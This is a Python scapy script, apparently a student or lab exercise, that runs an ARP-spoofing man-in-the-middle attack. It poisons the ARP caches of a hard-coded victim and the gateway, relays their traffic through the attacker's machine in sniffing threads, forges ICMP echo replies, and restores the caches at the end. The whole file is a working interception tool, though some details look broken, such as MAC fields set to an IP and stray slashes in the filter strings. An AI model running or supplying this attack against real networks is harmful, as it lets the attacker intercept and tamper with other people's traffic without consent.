from scapy.layers.inet import *
from scapy.layers.l2 import ARP
from scapy.all import *
import time, threading

# Approved by Nave
class OriginMap:
    def __init__(self, victim_ip, gateway_ip, host_ip):
        self.vic_ip = victim_ip
        self.gw_ip = gateway_ip
        self.my_ip = host_ip
        self.vic_mac = getmacbyip(victim_ip)
        self.gw_mac = getmacbyip(gateway_ip)
        self.my_mac = get_if_hwaddr(conf.iface)


""" this class is for threads that control one way 
of the communication between victim and gateway """
class OneWayCom(threading.Thread):

    def __init__(self, baseline, condition, action, durance):
        threading.Thread.__init__(self)
        self.baseline = baseline
        self.condition = condition
        self.actfunc = action
        self.durance = durance

    def run(self):
        if self.condition == 0:
            print("from victim")
            sniff(prn=lambda p:
            self.actfunc(p, self.baseline.my_mac, self.baseline.gw_mac),
                  filter=f"ether dst {self.baseline.my_mac} and ether src /"
                         f"{self.baseline.vic_mac} and not ether src /"
                         f"{self.baseline.my_mac}",
                  count=0, timeout=self.durance)
        else:
            print("from gateway")
            sniff(prn=lambda p: self.actfunc(p, self.baseline.my_mac,
                                             self.baseline.vic_mac),
                  filter=f"ether dst  {self.baseline.my_mac} and ether src /"
                         f"{self.baseline.gw_mac} and not ether src /"
                         f"{self.baseline.my_mac}",
                  count=0, timeout=self.durance)


def despoof(baseline):
    arp_gw = ARP(op=2, pdst=baseline.gw_ip,
                       hwdst=baseline.gw_mac, psrc=baseline.vic_ip)
    arp_vic = ARP(op=2, pdst=baseline.vic_ip,
                        hwdst=baseline.vic_ip, psrc=baseline.gw_ip)
    frame_header_gw = Ether(src=baseline.my_mac, dst=baseline.gw_mac)
    frame_header_vic = Ether(src=baseline.my_mac, dst=baseline.vic_mac)
    packet_to_vic = frame_header_vic/arp_vic
    packet_to_gw = frame_header_gw/arp_gw
    sendp(packet_to_gw, verbose=False)
    sendp(packet_to_vic, verbose=False)


""" this function takes a class of all ip's 
and mac's of all parties of the attack. 
it creates a fake ARP requests to map 
both forign parties ip to host mac address 
 """
def spoofer(baseline, durance):
    arp_gw = ARP(op=2, pdst=baseline.gw_ip,
                       hwdst=baseline.gw_mac, psrc=baseline.vic_ip)
    arp_vic = ARP(op=2, pdst=baseline.vic_ip,
                        hwdst=baseline.vic_ip, psrc=baseline.gw_ip)
    frame_header_gw = Ether(src=baseline.my_mac, dst=baseline.gw_mac)
    frame_header_vic = Ether(src=baseline.my_mac, dst=baseline.vic_mac)
    packet_to_vic = frame_header_vic/arp_vic
    packet_to_gw = frame_header_gw/arp_gw
    timeout = time.time() + float(durance)
    while(1):
        sendp(packet_to_gw, verbose=False)
        sendp(packet_to_vic, verbose=False)
        time.sleep(5)
        if time.time() > timeout:
            break
    despoof(baseline)


def forwarder(packet, new_src_mac, new_dst_mac):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        packet.dst = packet.src
        packet.src = new_src_mac
        temp = packet[1].src
        packet[1].src = packet[1].dst
        packet[1].dst = temp
        packet[0][ICMP].flags = None
        packet[0][ICMP].type = 0
        del packet[0][ICMP].chksum
        del packet[0][IP].chksum
        packet = packet.__class__(bytes(packet))
        sendp(packet, verbose=False)
    elif packet.haslayer(IP) and not packet[IP].dst == get_if_addr(conf.iface):
        packet["Ether"].src = new_src_mac
        packet["Ether"].dst = new_dst_mac
        frag = fragment(packet)
        for f in frag:
            sendp(f, verbose=False)
    else:
        pass


if __name__ == "__main__":
    victim_ip_address = '192.168.5.10'
    duration = float(input("how long would you like to listen for?(seconds) "))
    spoof_sample = OriginMap(victim_ip_address, conf.route.route('0.0.0.0')[2], get_if_addr(conf.iface))

    spoof = threading.Thread(target=spoofer, args=(spoof_sample, duration))
    gw_to_vic = OneWayCom(spoof_sample, 1, forwarder, duration)
    vic_to_gw = OneWayCom(spoof_sample, 0, forwarder, duration)

    spoof.start()
    gw_to_vic.start()
    vic_to_gw.start()
    vic_to_gw.join()
    gw_to_vic.join()
    spoof.join()
    despoof(spoof_sample)